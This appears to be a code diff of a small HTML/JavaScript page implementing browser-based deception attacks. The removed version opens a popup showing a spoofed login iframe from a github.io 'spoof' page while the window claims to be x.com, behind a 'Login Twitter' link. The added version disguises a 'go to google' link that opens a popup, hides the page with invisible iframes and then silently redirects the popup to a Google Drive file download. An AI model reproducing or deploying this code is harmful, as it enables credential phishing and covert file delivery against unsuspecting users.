@@ -1,38 +1,39 @@
+<body>
+<a id=test href="https://www.google.com/" onclick=foo()><h1>go to google</h1></a>
+</body>
 <script>
-  function next() {
-    // Redirect ke halaman Google setelah pengalihan
-    w.location.replace('https://www.google.com:1234');
-  }
-
-  function f() {
-    // Membuka jendela baru
-    w = window.open("");
-
-    // Menulis konten sementara dalam jendela baru
-    w.document.write('<h2>Login via Iframe</h2>');
-
-    // Menambahkan iframe yang memuat halaman login (x.com)
-    w.document.write('<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html" width="100%" height="500px" id="loginIframe"></iframe>');
-
-    // Mengubah lokasi jendela ke x.com
-    w.location = "https://x.com";
-
-    // Mengecek kondisi dan redirect setelah pengalihan
-    i = setInterval(function() {
-      try {
-        // Mengecek apakah lokasi berhasil berubah ke x.com
-        if (w.location.href === "https://x.com") {
-          // Lanjutkan menampilkan iframe jika berada di x.com
-          w.document.body.innerHTML = '<h2>Login via Iframe</h2>';
-          w.document.body.innerHTML += '<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html" width="100%" height="500px" id="loginIframe"></iframe>';
-        }
-      } catch (e) {
-        // Jika gagal, hentikan interval dan alihkan ke halaman Google
-        clearInterval(i);
-        next();
-      }
-    }, 1); // Mengecek setiap 1ms
-  }
+var w;
+var t;
+var z;
+function foo(){
+document.getElementById("test").href="#";
+w = window.open("fake");
+t = setInterval('bar()',1);
+}
+function bar(){
+if(w.location.href !== 'fake'){
+document.body.innerHTML = "";
+slow();
+w.location.href = 'https://www.google.com';
+clearInterval(t);
+z = setInterval('baz()',1);
+}
+}
+function baz(){
+try{
+w.location.href !== 'fake';
+}
+catch (e){
+setTimeout("w.location.replace('https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ35-KbmCMfyVHqljIMSuEN6%3A1773899415218');", 3000);
+clearInterval(z);
+}
+}
+function slow() {
+for (i=0; i<10; i++ ) {
+iframe = document.createElement("iframe");
+iframe.src = 'https://www.google.com/';
+iframe.style = 'display:none';
+document.body.appendChild(iframe);
+}
+}
 </script>
-
-<a href="#" onclick="f()">Login Twitter</a>
